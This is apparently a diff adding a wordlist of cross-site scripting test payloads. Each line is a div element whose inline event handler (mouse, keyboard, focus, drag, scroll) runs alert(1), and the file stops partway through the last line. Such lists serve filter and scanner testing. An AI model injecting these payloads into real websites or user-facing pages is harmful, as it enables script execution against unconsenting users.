@@ -1,0 +1,25 @@
+<div onmouseover=alert(1)>
+<div onmouseout=alert(1)>
+<div onclick=alert(1)>
+<div ondblclick=alert(1)>
+<div onmousedown=alert(1)>
+<div onmouseup=alert(1)>
+<div onmouseenter=alert(1)>
+<div onmouseleave=alert(1)>
+<div onmousemove=alert(1)>
+<div oncontextmenu=alert(1)>
+<div onwheel=alert(1)>
+<div onfocus=alert(1) tabindex=0>
+<div onblur=alert(1) tabindex=0>
+<div onkeydown=alert(1) tabindex=0>
+<div onkeyup=alert(1) tabindex=0>
+<div onkeypress=alert(1) tabindex=0>
+<div ondrag=alert(1)>
+<div ondragend=alert(1)>
+<div ondragenter=alert(1)>
+<div ondragleave=alert(1)>
+<div ondragover=alert(1)>
+<div ondragstart=alert(1)>
+<div ondrop=alert(1)>
+<div onscroll=alert(1)>
+<div onselect=
